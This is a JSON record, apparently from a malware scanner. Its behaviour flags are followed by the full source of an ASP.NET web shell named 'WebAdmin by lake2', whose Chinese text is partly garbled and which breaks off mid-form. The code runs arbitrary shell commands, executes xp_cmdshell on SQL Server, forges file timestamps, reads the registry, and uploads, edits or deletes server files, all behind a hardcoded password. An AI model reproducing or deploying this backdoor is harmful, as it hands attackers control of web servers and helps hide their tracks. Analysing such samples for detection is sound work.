{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "CurrentUser": "May detect Norman Sandbox",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Login_click": "Runs when the file is opened and ActiveX objects trigger events",
            "Open": "May open a file",
            "RegRead": "May read registry keys",
            "System": "May run an executable file or a system command on a Mac",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file",
            "adodb.stream": "May create a text file",
            "call": "May call a DLL using Excel 4 Macros",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "run": "May run an executable file or a system command"
        },
        "macro": "\u0421\ufffd\ufffd\ufffd\ufffd\u0271\ufffd\ufffd\n<%@ Page Language=\"VB\" ContentType=\"text/html\"  validateRequest=\"false\" aspcompat=\"true\"%>\n<%@ Import Namespace=\"System.IO\" %>\n<%@ import namespace=\"System.Diagnostics\" %>\n<%@ Import Namespace=\"Microsoft.Win32\" %>\n<%@ Import Namespace=\"System.Data\" %>\n<%@ Import Namespace=\"System.Data.OleDb\" %>\n<script runat=\"server\">\nDim PASSWORD as string = \"xiaoqi\"   '\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdxiaoqi  \ufffd\u053c\ufffd\ufffd\u0130\ufffd  \n'----------------------------------------------------------------------\n'-----------------           WebAdmin by lake2        -----------------\n'-----------------       E-mail: lakl2@mail.csdn.net  -----------------\n'-----------------           http://lake2.0x54.com    -----------------\n'-----------------              Version 2.X           -----------------\n'-----------------            Build (20050719)        -----------------\n'----------------------------------------------------------------------\n'  Description:\n'    1. This program run on ASP.NET environment,control the web\n'    2. It looks like backdoor , but I wish you like it .\n'    3. If you have some words to me , please send me a Email\n'------------\ndim ur1,TEMP1,TEMP2,TITLE,SORTFILED as string\nSub Login_click(sender As Object, E As EventArgs)\n\tif Textbox.Text=PASSWORD then     \n\t\tsession(\"lake2\")=1\n\t\tsession.Timeout=45\n\telse\n\t\tresponse.Write(\"<font color='red'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</font><br>\")\n\tend if\nEnd Sub\nSub RunCMD(Src As Object, E As EventArgs)\n\tDim myProcess As New Process()\n\tDim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)\n\tmyProcessStartInfo.UseShellExecute = False\n\tmyProcessStartInfo.RedirectStandardOutput = true\n\tmyProcess.StartInfo = myProcessStartInfo\n\tmyProcessStartInfo.Arguments=\"/c \" & Cmd.texT\n\tmyProcess.Start()\n\tDim myStreamReader As StreamReader = myProcess.StandardOutput\n\tDim myString As String = myStreamReader.Readtoend()\n\tmyProcess.Close()\n\tmystring=replace(mystring,\">\",\"&lt;\")\n\tmystring=replace(mystring,\"<\",\"&gt;\")\n\tresult.text=Cmd.text & vbcrlf & \"<pre>\" & mystring & \"</pre>\"\n\tCmd.text=\"\"\nEnd Sub\nSub CloneTime(Src As Object, E As EventArgs)\n\texistdir(time1.Text)\n\texistdir(time2.Text)\n\tDim thisfile As FileInfo =New FileInfo(time1.Text)\n\tDim thatfile As FileInfo =New FileInfo(time2.Text)\n\tthisfile.LastWriteTime = thatfile.LastWriteTime\n\tthisfile.LastAccessTime = thatfile.LastAccessTime\n\tthisfile.CreationTime = thatfile.CreationTime\n\tresponse.Write(\"<font color=\"\"red\"\">Clone Time \ufffd\u0279\ufffd!</font>\")\nEnd Sub\nSub ReadReg(Src As Object, E As EventArgs)\n\tDim error_x as Exception\nTry\n\tDim hu As String = Reg1.Text\n\tDim rk As RegistryKey\n\tSelect Mid( hu ,1 , Instr( hu,\"\\\" )-1 )\n\t\tcase \"HKEY_LOCAL_MACHINE\"\n\t\t\trk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )\n\t\tcase \"HKEY_CLASSES_ROOT\"\n\t\t\trk = Registry.ClassesRoot.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )\n\t\tcase \"HKEY_CURRENT_USER\"\n\t\t\trk = Registry.CurrentUser.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )\n\t\tcase \"HKEY_USERS\"\n\t\t\trk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )\n\t\tcase \"HKEY_CURRENT_CONFIG\"\n\t\t\trk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )\n\tEnd Select\n\tLabel1.Text = rk.GetValue(Reg2.Text , \"NULL\")\n\trk.Close()\nCatch error_x\n\tLabel1.Text = \"\ufffd\u0434\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01f2\ufffd\ufffd\ufffd\ufffd\u06b8\u00fc\ufffd\u05b5\ufffd\ufffd\"\nEnd Try\nEnd Sub\nsub Editor(Src As Object, E As EventArgs)\n\tdim mywrite as new streamwriter(filepath.text,false,encoding.default)\n\tmywrite.write(content.text)\n\tmywrite.close\n\tresponse.Write(\"<script>alert('\ufffd\u0f2d|\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd \" & replace(filepath.text,\"\\\",\"\\\\\") & \" \ufffd\u0279\ufffd\ufffd\ufffd\ufffd\ufffd\u02e2\ufffd\ufffd\u05ae\ufffd\ufffd')</sc\"&\"ript>\")\nend sub\nSub UpLoad(Src As Object, E As EventArgs)\n\tdim filename,loadpath as string\n\tfilename=path.getfilename(UpFile.value)\n\tloadpath=request.QueryString(\"src\") & filename\n\tif  file.exists(loadpath)=true then \n\t\tresponse.Write(\"<script>alert('\ufffd\u013c\ufffd\" & replace(loadpath,\"\\\",\"\\\\\") & \" \ufffd\u047e\ufffd\ufffd\ufffd\ufffd\u06a3\ufffd\ufffd\u03f4\ufffd\u02a7\ufffd\u0723\ufffd')</sc\"&\"ript>\")\n\t\tresponse.End()\n\tend if\n\tUpFile.postedfile.saveas(loadpath)\n\tresponse.Write(\"<script>alert('\ufffd\u013c\ufffd \" & replace(filename,\"\\\",\"\\\\\") & \" \ufffd\u03f4\ufffd\ufffd\u0279\ufffd\ufffd\ufffd\\n\ufffd\u013c\ufffd\ufffd\ufffd\u03e2\ufffd\ufffd\ufffd\u00a3\ufffd\\n\\n\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\" & replace(UpFile.value,\"\\\",\"\\\\\") & \"\\n\ufffd\u013c\ufffd\ufffd\ufffd\u0421\ufffd\ufffd\" & UpFile.postedfile.contentlength & \" bytes\\n\u0536\ufffd\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\" & replace(loadpath,\"\\\",\"\\\\\") & \"\\n');</scri\"&\"pt>\")\nEnd Sub\nSub NewFD(Src As Object, E As EventArgs)\n\tur1=request.form(\"src\")\n\tif NewFile.Checked = True then\n\t\tdim mywrite as new streamwriter(ur1 & NewName.Text,false,encoding.default)\n\t\tmywrite.close\n\t\tresponse.Redirect(request.ServerVariables(\"URL\") & \"?action=edit&src=\" & server.UrlEncode(ur1 & NewName.Text))\n\telse\n\t\tdirectory.createdirectory(ur1 & NewName.Text)\n\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd \" & replace(ur1 & NewName.Text ,\"\\\",\"\\\\\") & \" \ufffd\u0279\ufffd\ufffd\ufffd\u02e2\ufffd\ufffd\u05ae\ufffd\ufffd');</sc\" & \"ript>\")\n\tend if\nEnd Sub\nSub del(a)\n\tif right(a,1)=\"\\\" then\n\t\tdim xdir as directoryinfo\n\t\tdim mydir as new DirectoryInfo(a)\n\t\tdim xfile as fileinfo\n\t\tfor each xfile in mydir.getfiles()\n\t\t\tfile.delete(a & xfile.name)\n\t\tnext\n\t\tfor each xdir in mydir.getdirectories()\n\t\t\tcall del(a & xdir.name & \"\\\")\n\t\tnext\n\t\tdirectory.delete(a)\n\telse\n\t\tfile.delete(a)\n\tend if\nEnd Sub\nSub copydir(a,b)\n\tdim xdir as directoryinfo\n\tdim mydir as new DirectoryInfo(a)\n\tdim xfile as fileinfo\n\tfor each xfile in mydir.getfiles()\n\t\tfile.copy(a & \"\\\" & xfile.name,b & xfile.name)\n\tnext\n\tfor each xdir in mydir.getdirectories()\n\t\tdirectory.createdirectory(b & path.getfilename(a & xdir.name))\n\t\tcall copydir(a & xdir.name & \"\\\",b & xdir.name & \"\\\")\n\tnext\nEnd Sub\nSub xexistdir(temp,ow)\n\tif directory.exists(temp)=true or file.exists(temp)=true then \n\t\tif ow=0  then\n\t\t\tresponse.Redirect(request.ServerVariables(\"URL\") & \"?action=samename&src=\" & server.UrlEncode(ur1))\n\t\telseif ow=1 then\n\t\t\tdel(temp)\n\t\telse\n\t\t\tdim d as string = session(\"cutboard\")\n\t\t\tif right(d,1)=\"\\\" then\n\t\t\t\tTEMP1=ur1 & second(now) & path.getfilename(mid(replace(d,\"\u0001\",\"\"),1,len(replace(d,\"\u0001\",\"\"))-1))\n\t\t\telse\n\t\t\t\tTEMP2=ur1 & second(now) & replace(path.getfilename(d),\"\u0001\",\"\")\n\t\t\tend if\n\t\tend if\n\tend if\nEnd Sub\nSub existdir(temp)\n\t\tif  file.exists(temp)=false and directory.exists(temp)=false then \n\t\t\tresponse.Write(\"<script>alert('\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd \" & replace(temp,\"\\\",\"\\\\\")  &\"\ufffd\ufffd');</sc\" & \"ript>\")\n\t\t\tresponse.Write(\"<br><br><a href='javascript:history.back(1);'>\ufffd\ufffd\ufffd\ufffd</a>\")\n\t\t\tresponse.End()\n\t\tend if\nEnd Sub\nSub RunSQLCMD(Src As Object, E As EventArgs)\n\tDim adoConn,strQuery,recResult,strResult\n\tif SqlName.Text<>\"\" then\n\t\tadoConn=Server.CreateObject(\"ADODB.Connection\") \n\t\tadoConn.Open(\"Provider=SQLOLEDB.1;Password=\" & SqlPass.Text & \";UID=\" & SqlName.Text & \";Data Source = \" & ip.Text) \n\t\tIf Sqlcmd.Text<>\"\" Then \n\t\t\tstrQuery = \"exec master.dbo.xp_cmdshell '\" & Sqlcmd.Text & \"'\" \n\t  \t\trecResult = adoConn.Execute(strQuery) \n \t \t\tIf NOT recResult.EOF Then \n   \t\t\t\tDo While NOT recResult.EOF \n    \t\t\t\tstrResult = strResult & chr(13) & recResult(0).value\n    \t\t\t\trecResult.MoveNext \n   \t\t\t\tLoop \n \t \t\tEnd if \n  \t\t\trecResult = Nothing \n  \t\t\tstrResult = Replace(strResult,\" \",\"&nbsp;\") \n  \t\t\tstrResult = Replace(strResult,\"<\",\"&lt;\") \n  \t\t\tstrResult = Replace(strResult,\">\",\"&gt;\") \n\t\t\tresultSQL.Text=SqlCMD.Text & vbcrlf & \"<pre>\" & strResult & \"</pre>\"\n\t\t\tSqlCMD.Text=\"\"\n\t\t End if \n  \t\tadoConn.Close \n\t End if\n End Sub\nFunction GetStartedTime(ms) \n\tGetStartedTime=cint(ms/(1000*60*60))\nEnd function\nFunction getIP() \n    Dim strIPAddr as string\n    If Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\") = \"\" OR InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \"unknown\") > 0 Then\n        strIPAddr = Request.ServerVariables(\"REMOTE_ADDR\")\n    ElseIf InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \",\") > 0 Then\n        strIPAddr = Mid(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), 1, InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \",\")-1)\n    ElseIf InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \";\") > 0 Then\n        strIPAddr = Mid(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), 1, InStr(Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\"), \";\")-1)\n    Else\n        strIPAddr = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")\n    End If\n    getIP = Trim(Mid(strIPAddr, 1, 30))\nEnd Function\nFunction Getparentdir(nowdir)\n\tdim temp,k as integer\n\ttemp=1\n\tk=0\n\tif len(nowdir)>4 then \n\t\tnowdir=left(nowdir,len(nowdir)-1) \n\tend if\n\tdo while temp<>0\n\t\tk=temp+1\n\t\ttemp=instr(temp,nowdir,\"\\\")\n\t\tif temp =0 then\n\t\t\texit do\n\t\tend if\n\t\ttemp = temp+1\n\tloop\n\tif k<>2 then\n\t\tgetparentdir=mid(nowdir,1,k-2)\n\telse\n\t\tgetparentdir=nowdir\n\tend if\nEnd function\nFunction Rename()\n\tur1=request.QueryString(\"src\")\n\tif file.exists(Getparentdir(ur1) & request.Form(\"name\")) then\n\t\trename=0   \n\telse\n\t\tfile.copy(ur1,Getparentdir(ur1) & request.Form(\"name\"))\n\t\tdel(ur1)\n\t\trename=1\n\tend if\nEnd Function \nFunction GetSize(temp)\n\tif temp < 1024 then\n\t\tGetSize=temp & \" bytes\"\n\telse\n\t\tif temp\\1024 < 1024 then\n\t\t\tGetSize=temp\\1024 & \" KB\"\n\t\telse\n\t\t\tif temp\\1024\\1024 < 1024 then\n\t\t\t\tGetSize=temp\\1024\\1024 & \" MB\"\n\t\t\telse\n\t\t\t\tGetSize=temp\\1024\\1024\\1024 & \" GB\"\n\t\t\tend if\n\t\tend if\n\tend if\nEnd Function \n\tSub downTheFile(thePath)\n\t\tdim stream\n\t\tstream=server.createObject(\"adodb.stream\")\n\t\tstream.open\n\t\tstream.type=1\n\t\tstream.loadFromFile(thePath)\n\t\tresponse.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath)),\"+\",\" \"))\n\t\tresponse.addHeader(\"Content-Length\",stream.Size)\n\t\tresponse.charset=\"UTF-8\"\n\t\tresponse.contentType=\"application/octet-stream\"\n\t\tresponse.binaryWrite(stream.read)\n\t\tresponse.flush\n\t\tstream.close\n\t\tstream=nothing\n\t\tresponse.End()\n\tEnd Sub\nSub Page_Load(sender As Object, E As EventArgs)\n\tif request.QueryString(\"table\")<>\"\" then\n\t\tCall ShowTable()\n\tend if\nEnd Sub\nSub ShowTable()\n\tDB_eButton.Visible = True\n\tDB_eString.Visible = True\n\tDB_exe.Visible = True\n\tDB_CString.Text = session(\"DBC\") \n\tif instr(DB_CString.Text,\":\\\")<>0 then\n\t\tDB_rB_Access.Checked = true\n\t\tDB_rB_MSSQL.Checked = false\n\telse\n\t\tDB_rB_Access.Checked = false\n\t\tDB_rB_MSSQL.checked = true\n\tend if\n\tCall BindData()\nEnd Sub\nSub DB_ReLoad(sender As Object, E As EventArgs)\n\tresponse.Redirect(request.ServerVariables(\"PATH_INFO\") & \"?action=data\")\nEnd Sub\nSub DB_oneB(sender As Object, E As EventArgs)\n\tDim error_x as Exception\n\tTry\n\tDim db_conn As New OleDbConnection(session(\"DBC\"))\n\tDim db_cmd As New OleDbCommand( DB_EString.Text , db_conn ) \n\tdb_conn.Open()\n\tdb_cmd.ExecuteNonQuery()\n\tdb_conn.Close()\n\tCall BindData()\n\tCatch error_x\n\tresponse.Write(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd</font>\"&error_x.Message)\n\tresponse.End()\n\tEnd Try\nEnd Sub\nSub DB_onrB_1(sender As Object, E As EventArgs)\n\tDB_CString.Text = \"server=(local);UID=sa;PWD=;database=dvnews;Provider=SQLOLEDB\"\n\tDB_rB_Access.Checked = false\n\tDB_rB_MSSQL.Checked = true\nEnd Sub\nSub DB_onrB_2(sender As Object, E As EventArgs)\n\tDB_rB_Access.Checked = true\n\tDB_rB_MSSQL.Checked = false\n\tDB_CString.Text = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb\"\nEnd Sub\nSub DB_onsB(sender As Object, E As EventArgs)\n\tDB_eButton.Visible = True\n\tDB_eString.Visible = True\n\tDB_exe.Visible = True\n\tsession(\"DBC\") = DB_CString.Text\n\tDim i As Integer\n\tDim db_conn As New OleDbConnection(DB_CString.Text)\n\tDim db_schemaTable As DataTable \n\tdb_conn.open()\n\tdb_schemaTable = db_conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, New Object() {Nothing, Nothing, Nothing, \"TABLE\"})\n\tFor i = 0 To db_schemaTable.Rows.Count - 1\n\t\tdb_Label.Text += \"<a href='?action=data&table=\" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & \"'>\" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & \"</a><br>\"\n\tNext i\n\tdb_conn.close()\nEnd Sub\nSub DB_Page(sender As Object, e As System.Web.UI.WebControls.DataGridPageChangedEventArgs)\n\tDB_DataGrid.CurrentPageIndex = e.NewPageIndex\n\tCall BindData()\nEnd Sub\nSub DB_Sort(sender As Object, E As DataGridSortCommandEventArgs)\n\tSORTFILED = E.SortExpression\n\tCall BindData()\nEnd Sub\nSub BindData()\n\tDim db_conn As New OleDbConnection(session(\"DBC\"))\n\tDim db_cmd As New OleDbCommand(\"select * from \" & request.QueryString(\"table\") , db_conn ) \n\tDim db_adp As New OleDbDataAdapter(db_cmd)\n\tDim db_ds As New DataSet()\n\tdb_adp.Fill(db_ds,request.QueryString(\"table\"))\n\tDB_DataGrid.DataSource = db_ds.Tables(request.QueryString(\"table\")).DefaultView\n\tdb_ds.Tables(request.QueryString(\"table\")).DefaultView.Sort = SORTFILED\n\tDB_DataGrid.DataBind()\nEnd Sub\n</script>\n<%\nif request.QueryString(\"action\")=\"down\" and session(\"lake2\")=1 then\n\t\tdownTheFile(request.QueryString(\"src\"))\n\t\tresponse.End()\nend if\nDim hu as string = request.QueryString(\"action\")\nif hu=\"cmd\" then \nTITLE=\"WebAdmin 2.X -- CMD\"\nelseif hu=\"sqlrootkit\" then \nTITLE=\"WebAdmin 2.X -- SqlRootKit\"\nelseif hu=\"clonetime\" then \nTITLE=\"WebAdmin 2.X -- CloneTime\"\nelseif hu=\"information\" then \nTITLE=\"WebAdmin 2.X -- WebServerInfo\"\nelseif hu=\"reg\" then \nTITLE=\"WebAdmin 2.X -- RegRead\"\nelseif hu=\"goto\" then \nTITLE=\"WebAdmin 2.X -- FileManager\"\nelseif hu=\"data\" then \nTITLE=\"WebAdmin 2.X -- ControlDataBase\"\nelse \nTITLE=request.ServerVariables(\"HTTP_HOST\") \nend if\n%>\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n<style type=\"text/css\">\nbody,td,th {\n\tcolor: #0000FF;\n\tfont-family: Verdana;\n}\nbody {\n\tbackground-color: #ffffff;\n\tfont-size:14px; \n}\na:link {\n\tcolor: #0000FF;\n\ttext-decoration: none;\n}\na:visited {\n\ttext-decoration: none;\n\tcolor: #0000FF;\n}\na:hover {\n\ttext-decoration: none;\n\tcolor: #FF0000;\n}\na:active {\n\ttext-decoration: none;\n\tcolor: #FF0000;\n}\n.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}\n.TextBox {border: 1px solid #084B8E}\n.style3 {color: #FF0000}\n</style>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\" charset=gb2312>\n<title><%=TITLE%></title>\n</head>\n<body>\n<%\nDim error_x as Exception\nTry\nif session(\"lake2\")<>1 then\n\tresponse.Write(\"<br>\")\n\tresponse.Write(\"Hello , thank you for using my program !<br>\")\n\tresponse.Write(\"This program is run at ASP.NET Environment and manage the web directory.<br>\")\n\tresponse.Write(\"Maybe this program looks like a backdoor , but I wish you like it and don't hack :p<br><br>\")\n\tresponse.Write(\"<span class=\"\"style3\"\">Notice:</span> only click \"\"Login\"\" to login.\")\n%>\n<form runat=\"server\">\n  Your Password:<asp:TextBox ID=\"TextBox\" runat=\"server\"  TextMode=\"Password\" class=\"TextBox\" />  \n  <asp:Button  ID=\"Button\" runat=\"server\" Text=\"Login\" ToolTip=\"Click here to login\"  OnClick=\"login_click\" class=\"buttom\" />\n</form> \n<%\nelse\n\tdim temp as string\n\ttemp=request.QueryString(\"action\")\n\tif temp=\"\" then temp=\"goto\"\n\tselect case temp\n\tcase \"goto\"\n\t\tif request.QueryString(\"src\")<>\"\" then\n\t\t\tur1=request.QueryString(\"src\")\n\t\telse\n\t\t\tur1=server.MapPath(\".\") & \"\\\"\n\t\tend if\n\tcall existdir(ur1)\n\tdim xdir as directoryinfo\n\tdim mydir as new DirectoryInfo(ur1)\n\tdim hupo as string\n\tdim xfile as fileinfo\n%>\n<p align=\"center\">\ufffd\ufffd\u01f0\u013f\u00bc\ufffd\ufffd<font color=red><%=ur1%></font></p>\n<table width=\"70%\"  border=\"0\" align=\"center\">\n  <tr>\n    <td width=\"13%\">Operate:</td>\n    <td width=\"87%\"><a href=\"?action=new&src=<%=server.UrlEncode(ur1)%>\" title=\"\ufffd\u00bd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\u013f\u00bc\" target=\"_blank\">\ufffd\u00bd\ufffd</a>\n      <%if session(\"cutboard\")<>\"\" then%>\n      <a href=\"?action=plaster&src=<%=server.UrlEncode(ur1)%>\" title=\"\u0573\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\">\u0573\ufffd\ufffd</a>\n      <%else%>\n\u0573\ufffd\ufffd\n<%end if%>\n<a href=\"?action=upfile&src=<%=server.UrlEncode(ur1)%>\" title=\"\ufffd\u03f4\ufffd\ufffd\u013c\ufffd\" target=\"_blank\">\ufffd\u03f4\ufffd</a> <a href=\"?action=goto&src=\" & <%=server.MapPath(\".\")%> title=\"\ufffd\u0635\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd\u013f\u00bc\">\ufffd\ufffd\ufffd\ufffd </a><a href=\"?action=logout\" title=\"Exit\">\ufffd\ubfea</a></td>\n  </tr>\n  <tr>\n    <td>\n\t\u05ea\ufffd\ufffd\ufffd\ufffd</td>\n    <td>\n<%\ndim i as integer\nfor i =0 to Directory.GetLogicalDrives().length-1\n \tresponse.Write(\"<a href='?action=goto&src=\" & Directory.GetLogicalDrives(i) & \"'>\" & Directory.GetLogicalDrives(i) & \" </a>\")\nnext\n%>\n</td>\n  </tr>\n\n  <tr>\n    <td>\ufffd\ufffd\ufffd\u07e3\ufffd</td>\n    <td><a href=\"?action=sqlrootkit\" target=\"_blank\">SqlRootKit.NET </a><a href=\"?action=cmd\" target=\"_blank\">CMD.NET</a> <a href=\"?action=clonetime&src=<%=server.UrlEncode(ur1)%>\" target=\"_blank\">CloneTime</a> <a href=\"?action=information\" target=\"_blank\">SysInfomation</a> <a href=\"?action=reg\" target=\"_blank\">ReadReg</a> <a href=\"?action=data\" target=\"_blank\">DataBase</a> </td>\n  </tr>\n</table>\n<hr noshade>\n<table width=\"90%\"  border=\"0\" align=\"center\">\n\t<tr>\n\t<td width=\"40%\"><strong>\ufffd\ufffd\ufffd\ufffd</strong></td>\n\t<td width=\"15%\"><strong>\ufffd\ufffd\u0421</strong></td>\n\t<td width=\"20%\"><strong>\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd</strong></td>\n\t<td width=\"25%\"><strong>\ufffd\ufffd\ufffd\ufffd</strong></td>\n\t</tr>\n      <tr>\n        <td><%\n\t\thupo= \"<tr><td><a href='?action=goto&src=\" & server.UrlEncode(Getparentdir(ur1)) & \"'><i>|\ufffd\ufffd\u013f\u00bc|</i></a></td></tr>\"\n\t\tresponse.Write(hupo)\n\t\tfor each xdir in mydir.getdirectories()\n\t\t\tresponse.Write(\"<tr>\")\n\t\t\tdim filepath as string \n\t\t\tfilepath=server.UrlEncode(ur1 & xdir.name)\n\t\t\thupo= \"<td><a href='?action=goto&src=\" & filepath & \"\\\" & \"'>\" & xdir.name & \"</a></td>\"\n\t\t\tresponse.Write(hupo)\n\t\t\tresponse.Write(\"<td>&lt;dir&gt;</td>\")\n\t\t\tresponse.Write(\"<td>\" & Directory.GetLastWriteTime(ur1 & xdir.name) & \"</td>\")\n\t\t\thupo=\"<td><a href='?action=cut&src=\" & filepath & \"\\'  target='_blank'>\ufffd\ufffd\ufffd\ufffd\" & \"</a>|<a href='?action=copy&src=\" & filepath & \"\\'  target='_blank'>\ufffd\ufffd\ufffd\ufffd</a>|<a href='?action=del&src=\" & filepath & \"\\'\" & \" onclick='return del(this);'>\u027e\ufffd\ufffd</a></td>\"\n\t\t\tresponse.Write(hupo)\n\t\t\tresponse.Write(\"</tr>\")\n\t\tnext\n\t\t%></td>\n  </tr>\n\t\t<tr>\n        <td><%\n\t\tfor each xfile in mydir.getfiles()\n\t\t\tdim filepath2 as string\n\t\t\tfilepath2=server.UrlEncode(ur1 & xfile.name)\n\t\t\tresponse.Write(\"<tr>\")\n\t\t\thupo=\"<td>\" & xfile.name & \"</td>\"\n\t\t\tresponse.Write(hupo)\n\t\t\thupo=\"<td>\" & GetSize(xfile.length) & \"</td>\"\n\t\t\tresponse.Write(hupo)\n\t\t\tresponse.Write(\"<td>\" & file.GetLastWriteTime(ur1 & xfile.name) & \"</td>\")\n\t\t\thupo=\"<td><a href='?action=edit&src=\" & filepath2 & \"' target='_blank'>\ufffd\u0f2d</a>|<a href='?action=cut&src=\" & filepath2 & \"' target='_blank'>\ufffd\ufffd\ufffd\ufffd</a>|<a href='?action=copy&src=\" & filepath2 & \"' target='_blank'>\u0573\ufffd\ufffd</a>|<a href='?action=rename&src=\" & filepath2 & \"' target='_blank'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</a>|<a href='?action=down&src=\" & filepath2 & \"' onClick='return down(this);'>\ufffd\ufffd\ufffd\ufffd</a>|<a href='?action=del&src=\" & filepath2 & \"' onClick='return del(this);'>\u027e\ufffd\ufffd</a></td>\"\n\t\t\tresponse.Write(hupo)\n\t\t\tresponse.Write(\"</tr>\")\n\t\tnext\n\t\tresponse.Write(\"</table>\")\n\t\t%></td>\n      </tr>\n</table>\n<script language=\"javascript\">\nfunction del()\n{\nif(confirm(\"\ufffd\ufffd\ufffd\u0176\ufffd\ufffd\ufffd\ufffd\ufffd\u027e\ufffd\ufffd\ufffd\ufffd\")){return true;}\nelse{return false;}\n}\nfunction down()\n{\nif(confirm(\"\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd10M\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0368\ufffd\ufffdhttp\u042d\ufffd\ufffd\ufffd\ufffd\ufffd\u0623\ufffd\\n\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\")){return true;}\nelse{return false;}\n}\n</script>\n<%\ncase \"information\"\n\tdim CIP,CP as string\n\tif getIP()<>request.ServerVariables(\"REMOTE_ADDR\") then\n\t\t\tCIP=getIP()\n\t\t\tCP=request.ServerVariables(\"REMOTE_ADDR\")\n\telse\n\t\t\tCIP=request.ServerVariables(\"REMOTE_ADDR\")\n\t\t\tCP=\"None\"\n\tend if\n%>\n<table width=\"80%\"  border=\"1\" align=\"center\">\n  <tr>\n    <td colspan=\"2\"><span class=\"style3\">Web Server Information                 </span><i><a href=\"javascript:closewindow();\">\ufffd\u0631\ufffd</a></i></td>\n  </tr>\n  <tr>\n    <td width=\"40%\">Server IP</td>\n    <td width=\"60%\"><%=request.ServerVariables(\"LOCAL_ADDR\")%></td>\n  </tr>\n  <tr>\n    <td height=\"73\">Machine Name</td>\n    <td><%=Environment.MachineName%></td>\n  </tr>\n  <tr>\n    <td>Network Name</td>\n    <td><%=Environment.UserDomainName.ToString()%></td>\n  </tr>\n  <tr>\n    <td>User Name in this Process</td>\n    <td><%=Environment.UserName%></td>\n  </tr>\n  <tr>\n    <td>OS Version</td>\n    <td><%=Environment.OSVersion.ToString()%></td>\n  </tr>\n  <tr>\n    <td>Started Time</td>\n    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>\n  </tr>\n  <tr>\n    <td>System Time</td>\n    <td><%=now%></td>\n  </tr>\n  <tr>\n    <td>IIS Version</td>\n    <td><%=request.ServerVariables(\"SERVER_SOFTWARE\")%></td>\n  </tr>\n  <tr>\n    <td>HTTPS</td>\n    <td><%=request.ServerVariables(\"HTTPS\")%></td>\n  </tr>\n  <tr>\n    <td>PATH_INFO</td>\n    <td><%=request.ServerVariables(\"PATH_INFO\")%></td>\n  </tr>\n  <tr>\n    <td>PATH_TRANSLATED</td>\n    <td><%=request.ServerVariables(\"PATH_TRANSLATED\")%></td>\n  <tr>\n    <td>SERVER_PORT</td>\n    <td><%=request.ServerVariables(\"SERVER_PORT\")%></td>\n  </tr>\n    <tr>\n    <td>SeesionID</td>\n    <td><%=Session.SessionID%></td>\n  </tr>\n  <tr>\n    <td colspan=\"2\"><span class=\"style3\">Client Infomation</span></td>\n  </tr>\n  <tr>\n    <td>Client Proxy</td>\n    <td><%=CP%></td>\n  </tr>\n  <tr>\n    <td>Client IP</td>\n    <td><%=CIP%></td>\n  </tr>\n  <tr>\n    <td>User</td>\n    <td><%=request.ServerVariables(\"HTTP_USER_AGENT\")%></td>\n  </tr>\n</table>\n<%\n\tcase \"cmd\"\n%>\n<form runat=\"server\">\n  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href=\"javascript:closewindow();\">Close</a></i></p>\n  <p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to 